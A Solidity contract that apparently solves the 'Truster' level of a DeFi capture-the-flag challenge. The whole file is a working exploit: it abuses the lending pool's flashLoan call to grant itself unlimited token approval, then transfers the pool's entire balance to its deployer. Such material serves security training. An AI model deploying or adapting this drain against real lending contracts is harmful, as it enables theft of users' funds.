// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IPool {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
}

contract TrusterAttacker {
    address private admin;
    IERC20 immutable damnValubeleToken;
    IPool immutable lendingPool;

    constructor(address _addr, address _addressPool) {
        admin = msg.sender;
        damnValubeleToken = IERC20(_addr);
        lendingPool = IPool(_addressPool);
    }

    function attack() external {
        //Approve unlimited spending of pool through flash loan
        bytes memory data = abi.encodeWithSignature(
            ("approve(address,uint256)"),
            address(this),
            2**256 - 1
        );

        lendingPool.flashLoan(
            0,
            address(this),
            address(damnValubeleToken),
            data
        );
        uint256 balance = damnValubeleToken.balanceOf(address(lendingPool));
        damnValubeleToken.transferFrom(
            address(lendingPool),
            admin,
            balance
        );
    }
}
